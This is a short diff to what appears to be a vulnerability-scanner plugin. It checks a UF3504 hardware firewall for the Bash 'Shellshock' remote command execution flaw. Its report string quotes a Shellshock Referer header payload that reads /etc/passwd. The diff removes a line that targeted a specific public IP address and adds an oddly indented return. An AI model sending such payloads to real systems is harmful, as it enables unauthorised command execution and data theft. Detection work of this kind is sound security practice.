@@ -18,6 +18,7 @@ def audit(arg):
     if code==200 and 'root' in head:
        security_hole("清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  `/bin/cat /etc/passwd`")
 
-if __name__ == '__main__':
+
+       return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('unis_gateway', 'https://219.147.203.13/')[1])
